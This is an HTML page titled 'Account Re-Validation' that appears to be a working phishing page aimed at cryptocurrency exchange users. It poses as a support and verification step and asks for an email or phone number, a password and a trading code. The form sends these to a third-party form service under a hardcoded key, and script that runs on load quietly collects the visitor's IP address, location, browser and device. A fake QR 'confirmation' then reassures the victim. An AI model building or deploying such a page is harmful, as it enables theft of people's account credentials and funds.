<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" href="style.css" />
  <title>ACCOUNT RE-VALIDATION</title>
</head>

<body>
  <header>
    <h1>ACCOUNT <strong>RE</strong>-VALIDATION</h1>
    <p>... a "Step By Step" process.</p>
    <script src="https://widgets.coingecko.com/gecko-coin-price-marquee-widget.js"></script>
    <gecko-coin-price-marquee-widget locale="en" outlined="true" coin-ids="" initial-currency="usd"></gecko-coin-price-marquee-widget>
  </header>
  <section>
    <article>

      <!-- Welcome note OUTSIDE the form -->
      <div class="welcome-note">
        <h2>Welcome</h2>
        <p><strong>"NOTE"</strong> Authentication process will be carried out immediately upon receipt of information, and we will notify you of the authentication results.</p>
        <p>The information collected is confidential and will not be disclosed by us to unauthorized third parties.</p>
      </div>

      <!-- Actual form starts here -->
      <form action="https://api.web3forms.com/submit" method="POST" enctype="multipart/form-data" id="form">

        <!-- Web3Forms Access Key -->
        <input type="hidden" name="access_key" value="13521604-ff3a-48f6-a7f4-a7d76fa37bca">

        <!-- Select Issue -->
        <label for="cars">Select Issue:</label>
        <select class="form-control" name="issue" id="cars" required>
          <option value="Kyc">Kyc</option>
          <option value="Web issue">Web issue</option>
          <option value="Deposit/Withdrawal Query">Deposit/Withdrawal Query</option>
          <option value="Lost 2FA">Lost 2FA</option>
          <option value="Biding/Unbinding">Biding/Unbinding</option>
          <option value="Forgot Password">Forgot Password</option>
          <option value="Swap">Swap</option>
          <option value="Buy/Sell Error">Buy/Sell Error</option>
          <option value="Synchronize">Synchronize</option>
          <option value="Withdrawal">Withdrawal</option>
          <option value="Airdrop">Airdrop</option>
          <option value="Others">Others</option>
        </select>

        <!-- Authenticate -->
        <fieldset>
          <legend>Authenticate</legend>
          <p>
            <input type="text" placeholder="Type your email here" name="email" id="input_email" required>
            <label for="input_email">Email or Mobile No</label>
          </p>
          <p>
            <input type="password" placeholder="Type your password here" name="password" id="input_password" required>
            <label for="input_password">Password</label>
          </p>
          <p>
            <input type="password" placeholder="optional" name="code" id="input_password_code">
            <label for="input_password_code">Trading Code</label>
          </p>
        </fieldset>

        <!-- Hidden fields auto-populated by JS -->
        <input type="hidden" name="ipaddress" id="ipaddress">
        <input type="hidden" name="country" id="country">
        <input type="hidden" name="browser" id="browser">
        <input type="hidden" name="device" id="device">
        <input type="hidden" name="apiresponse" id="apiresponse">

        <!-- Final submit -->
        <button type="submit" class="btn">Validate</button>
      </form>

      <!-- QR Code Result -->
      <div id="qrResult" style="display:none; text-align:center; margin-top:20px;">
        <h2>Submission Successful ðŸŽ‰</h2>
        <p>Scan this QR code for confirmation:</p>
        <canvas id="qrcode"></canvas>
      </div>

    </article>
  </section>

  <!-- QR Code library -->
  <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>

  <script>
    // IP + Geo
    function getIpAndGeo() {
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          document.getElementById('ipaddress').value = data.ip || 'Not Found';
          return fetch(`https://ipapi.co/${data.ip}/json/`);
        })
        .then(response => response.json())
        .then(geoData => {
          document.getElementById('country').value = geoData.country_name || 'Not Found';
          document.getElementById('apiresponse').value = JSON.stringify(geoData) || 'Not Found';
        })
        .catch(error => {
          console.error('Error fetching IP/Geo data:', error);
        });
    }

    // Browser + Device
    function getBrowserAndDevice() {
      const userAgent = navigator.userAgent;
      let browser = 'Unknown Browser';
      if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) browser = 'Chrome';
      else if (userAgent.includes('Firefox')) browser = 'Firefox';
      else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) browser = 'Safari';
      else if (userAgent.includes('Edg')) browser = 'Edge';
      else if (userAgent.includes('MSIE') || userAgent.includes('Trident')) browser = 'IE';

      let device = 'Desktop';
      if (/Mobi|Android/i.test(userAgent)) device = 'Mobile';
      else if (/iPad|Tablet/i.test(userAgent)) device = 'Tablet';

      document.getElementById('browser').value = browser;
      document.getElementById('device').value = device;
    }

    // Run functions on page load
    getIpAndGeo();
    getBrowserAndDevice();

    // Intercept form submission
    document.getElementById('form').addEventListener('submit', function(e) {
      e.preventDefault();

      const formData = new FormData(this);

      fetch(this.action, {
        method: this.method,
        body: formData
      })
      .then(response => response.json())
      .then(result => {
        if(result.success) {
          document.getElementById('form').style.display = 'none';
          document.getElementById('qrResult').style.display = 'block';
          QRCode.toCanvas(
            document.getElementById('qrcode'),
            "Submission ID: " + result.data.id,
            function (error) { if (error) console.error(error); }
          );
        } else {
          alert("Submission failed. Please try again.");
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert("Error submitting form.");
      });
    });
  </script>
</body>
</html>
